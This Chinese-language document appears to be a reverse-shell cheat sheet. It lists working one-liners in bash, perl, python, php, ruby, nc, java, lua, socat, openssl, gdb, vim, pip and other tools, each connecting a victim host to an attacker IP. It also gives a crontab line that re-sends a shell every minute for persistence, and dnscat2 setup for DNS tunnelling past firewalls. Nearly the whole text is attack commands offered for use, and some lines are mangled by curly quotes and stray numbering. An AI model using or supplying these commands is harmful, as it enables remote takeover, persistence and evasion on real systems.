



```php

PHP：
php -r '$sock=fsockopen("192.168.10.13",8888);exec("/bin/sh -i <&3>&3 2>&3");'

```

```
写入命令到定时任务文件
我们可以在远程主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道远程主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/当前用户命令的文件  内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(debian系列主机)

*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/192.168.10.11/4444 0>&1
#每隔一分钟，向192.168.10.27的4444号端口发送shell

```





```bash
#bash版本：
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

#perl版本:
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#python版本：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#php版本：
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

#ruby版本：
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#nc版本：
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

#java版本
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

#lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

##### 1.Nc -e反弹

攻击端：

nc -lvp 23333

受害端：

nc -e /bin/bash 192.168.154.129 23333



##### 2.Bash -i反弹

攻击端：

nc -lvp 23333

受害端：

bash -i >/dev/tcp/192.168.154.129/23333 0>&1 2>&1

（bash重定向到攻击机23333端口0和2表示标准输出和错误输出都重定向到攻击端。）



##### 3.Telnet反弹(需安装telnet服务)

攻击端：

nc -lvp 23333

受害端：

telnet 192.168.154.129 23333 | /bin/bash | telnet 192.168.154.129
23334



第一个监听窗口执行命令：

第二个监听窗口回显：

##### 4.Whois反弹

攻击端：

nc -lvp 23333

受害端：

whois -h 192.168.85.141 -p 23333 ‘whoami’

获得回显：


5.socat反弹
攻击端：

nc -lvp 23333

受害端：

socat exec:’bash -li’,pty,stderr,setsid,sigint,sane
tcp:192.168.154.129:23333



##### 6.Python反弹

攻击端：

nc -lvp 23333

受害端：

Python -c “import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.154.129’,23333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([’/bin/bash’,’-i’]);”



##### 7.Php -r反弹

攻击端：

nc -lvp 23333

受害端：

php -r ‘$sock=fsockopen(“127.0.0.1”,23333);system("/bin/bash -i <&3 >&3 2>&3");’

(要先确认system函数在ini中是否被禁用)



##### 8.Dnscat反弹

（基于DNS协议的通信工具，一般的通信工具基于TCP等的传输方式非常容易被防火墙拦截，但是dnscat2基于的DNS查询与响应报文一般不会被拦截，进而可以完成信息传输。）
DnsCat服务器的安装:

#git clone https://github.com/iagox86/dnscat2.git
#cd dnscat2
#cd server
#sudo gem install bundler
#bundle install
#sudo ruby./dnscat2.rb
1
2
3
4
5
6


客户端：

git clone https://github.com/iagox86/dnscat2 
cd dnscat2/client/ 
Make
./dnscat --dns server=192.168.2.101,port=53 --secret=706f8a6c1950ea305a82c9d6d873b958
1
2
3
4
会话建立：

列出所有通道

windows
1

进入客户端1通道

window -i 1
1

建立反弹shell

shell
1

退出当前通道，进入shell

suspend //表示退出当前通道
Windows
window -i 2//进入shell通道后，可按ctrl+z退出当前shell
1
2
3


9.Cpan反弹
CPAN是一支Perl程序的名字，其作用是让使用者容易从CPAN下载、安装、更新及管理其他在CPAN上的Perl程式。

攻击机监听：nc -lvp RPORT
受害机：

cpan
! use Socket; my $i="[攻击机IP]"; my $p=[攻击机端口]; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
1
2



##### 10.easy_install反弹

easy_install是由PEAK(Python Enterprise Application Kit)开发的setuptools包里带的一个命令，所以使用easy_install实际上是在调用setuptools来完成安装模块的工作。

攻击机：

socat file:`tty`,raw,echo=0 tcp-listen:12345

受害机：
export 的意思是定义全局变量。

export RHOST=192.168.85.141 export RPORT=12345 TF=$(mktemp -d) echo
‘import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")’ >
$TF/setup.py easy_install $TF

获得响应：

##### 11.Gdb反弹

UNIX及UNIX-like下的调试工具。

攻击机：

socat file:`tty`,raw,echo=0 tcp-listen:12345

受害机：

export RHOST=192.168.85.141 export RPORT=12345 gdb -nx -ex ‘python
import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")’ -ex
quit



获得响应：

##### 11.Ksh反弹

ksh 命令调用 Korn shell，这个 shell 是一个交互式的命令解释器和命令编程语言。这个 shell 可交互式的从终端键盘或从一个文件中执行命令。

攻击机：

nc -l -p 12345

受害机：

export RHOST=192.168.85.141
export RPORT=12345
ksh -c ‘ksh -i >/dev/tcp/$RHOST/$RPORT 2>&1 0>&1’


获得响应：

##### 12.openssl 反弹

OpenSSL是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。这个包广泛被应用在互联网的网页服务器上。

攻击机：

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days
365 -nodes openssl s_server -quiet -key key.pem -cert cert.pem -port 12345




受害机：

RHOST=192.168.85.141 RPORT=12345 mkfifo /tmp/s; /bin/sh -i < /tmp/s
2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s



获得响应：

##### 13.Pip反弹

攻击机：

socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.

受害机：

export RHOST=192.168.85.141 export RPORT=12345 TF=$(mktemp -d) echo
‘import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")’ >
$TF/setup.py pip install $TF


获得响应:

##### 14.Rvim反弹

相当于vim
此方法需要python3环境

攻击机：

socat file:`tty`,raw,echo=0 tcp-listen:12345

受害机：

export RHOST=192.168.85.141 export RPORT=12345 rvim -c ‘:py import
vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")
vim.command(":q!")’



获得响应：

##### 15.Vim反弹

```
vim需要python3环境

攻击机：

socat file:`tty`,raw,echo=0 tcp-listen:12345


受害机：

export RHOST=192.168.85.141 export RPORT=12345 vim -c ‘:py import
vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn("/bin/sh")
vim.command(":q!")’


获得响应：


```


